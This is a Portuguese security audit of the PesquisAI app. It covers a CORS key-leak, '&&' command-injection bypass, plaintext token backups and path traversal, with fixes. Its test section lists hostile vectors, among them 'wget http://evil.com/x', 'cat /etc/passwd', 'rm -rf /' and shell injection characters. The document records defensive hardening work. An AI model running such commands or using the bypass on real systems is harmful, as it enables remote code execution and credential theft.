# 🔐 Auditoria de Segurança — UFVAI/PesquisAI v0.6.0

**Data:** 21/08/2026 · **Escopo:** revisão integral do código (`launch_app.py`, `security.py`, `launch_app_responsive_v041.py`, `run_fast.py`, `obsidian/*`, `i18n/*`, scripts, Dockerfile) · **Método:** leitura linha a linha dos handlers HTTP + grep de padrões perigosos (`shell=True`, `eval/exec`, `verify=False`, CORS, binds).

## Achados e correções

### 🔴 Críticos

| ID | Achado (local no código v0.5.1.9) | Risco | Correção v0.6.0 |
|---|---|---|---|
| C1 | `Access-Control-Allow-Origin: *` em **todos** os endpoints JSON + OPTIONS (`_json()` ~L717). Combinado com `GET /api/apikey?provider=X` que devolvia a **chave em texto puro**, qualquer página web aberta pelo usuário podia exfiltrar chaves via fetch cross-origin (drive-by) | Roubo de credenciais | ACAO removida (UI é same-origin); token de sessão aleatório gerado por launch(), injetado no HTML do wrapper e exigido em `/api/*` via header `X-UFVAI-Token`; patch único em `window.fetch` adiciona o header automaticamente — zero mudança nos fluxos da UI |
| C2 | `sanitize_command` validava prefixo **apenas do 1º token**: `ls && <qualquer coisa>` passava → RCE via `/api/run_terminal` | Execução remota de comandos | Validação de **cada segmento** separado por `&&` (split respeitando aspas duplas) contra a allowlist; vetores `ls && bash -c …`, `opencode && wget …` agora bloqueados; fluxos legítimos (`export K=v && opencode`) preservados — cobertos por testes novos |
| C3 | `opencode_auth.json` (contém **tokens de acesso**) copiado em texto claro para `backups/` no Drive | Vazamento de tokens no Drive | Gravação cifrada com Fernet (`{"_ufvai_enc":true,"data":…}`); leitura retrocompatível aceita arquivo legado plaintext |

### 🟠 Médios

| ID | Achado | Correção |
|---|---|---|
| M1 | `GET /api/apikey?provider=` retornava chave completa | Retorna sempre mascarada (`4 chars…`) |
| M2 | `/api/debug`, `/api/diagnose`, `/api/health` listavam **nomes** de variáveis de ambiente secretas | Substituído por contagens (`*_count`) |
| M3 | `/api/restore` concatenava `body["file"]` sem sanitização (path traversal de leitura); nome de backup usava `session_id` cru | `os.path.basename()` + regex `[A-Za-z0-9._-]+\.json`; `session_id` filtrado para `[A-Za-z0-9_-]` |
| M4 | `HTTPServer` single-threaded; corpo POST ilimitado | `ThreadingHTTPServer`; cap de 10 MB (HTTP 413) |
| M5 | Sem rate limiting | Limite generoso de 120 req/min/IP nos mutantes (invisível ao uso normal) |

### 🟡 Baixos / decisões documentadas

| ID | Item | Decisão v0.6.0 |
|---|---|---|
| B1 | `--yolo` auto-aprova ações do agente | **Mantido por padrão** (decisão do usuário — compatibilidade). Desligável com `PESQUISAI_YOLO=0`. Aviso impresso no boot quando ativo não é necessário; risco documentado aqui |
| B2 | Chaves exportadas em `~/.bashrc` (plaintext na VM efêmera) | Mantido (persistência entre restarts do terminal dentro da sessão); escrita agora usa context managers (corrige ResourceWarning). Recomendação futura: remover |
| B3 | Bind `0.0.0.0` sempre | Colab mantém `0.0.0.0` (exigência do proxy Google); uso local (.deb) passa a `127.0.0.1`; override universal `UFVAI_BIND_HOST` (Docker: definir `0.0.0.0`) |
| B4 | ttyd sem credenciais | Opcional via `PESQUISAI_TTYD_CRED=user:senha` (não habilitado por padrão para não conflitar com proxy Colab) |

## Não-problemas verificados

- ✅ `obsidian/vault.py::_resolve_safe()` já bloqueava path traversal (`relative_to(root)`);
- ✅ Sem `eval/exec/pickle` no caminho das requisições; sem `verify=False`;
- ✅ Backup/restore validam JSON contra truncamento FUSE antes de importar.

## Testes

- Suíte completa: **233 passed** (inclui novos vetores de segmento `&&`, telemetria opt-in e sync 0.6.0).
- Vetores rejeitados cobertos: `ls && bash -c 'evil'` · `opencode && wget http://evil.com/x` · `cat /etc/passwd` · `rm -rf /` · injeções `;` `` ` `` `$()` `${}` `>` `<` newline/null.
- Vetores aceitos (compatibilidade UI): `export OPENAI_API_KEY="sk-abc" && opencode` · `opencode -s ses_x` · `ls && pwd`.

## Limitações residuais (aceitas, documentadas)

1. Ambiente multiusuário compartilhando a mesma VM Colab poderia acessar portas locais — fora do modelo de ameaça do produto;
2. Token de sessão protege `/api/*`, mas quem tiver acesso à aba/proxy autenticado do Colab continua autorizado (por design);
3. `--yolo` permanece poderoso: recomenda-se `PESQUISAI_YOLO=0` em dados sensíveis.

## Correção adicional pós-cópia (22/08/2026)

- **Escapes inválidos latentes normalizados**: 12 ocorrências de sequências JS-regex escritas
  com barra única dentro de strings Python (`\/`, `\[`, `\]`, `\|`, `\-`, `\s`) emitiam
  `SyntaxWarning` desde Python 3.12 (e `SyntaxError` sob filtros estritos/pytest warnings-as-errors
  em máquinas sem cache de bytecode). Todas duplicadas para forma explícita (`\\X`) — **valor das
  strings preservado byte a byte** (comportamento documentado de escapes inválidos). Detectado ao
  rodar a suíte diretamente na cópia final no Google Drive, sem `__pycache__`.
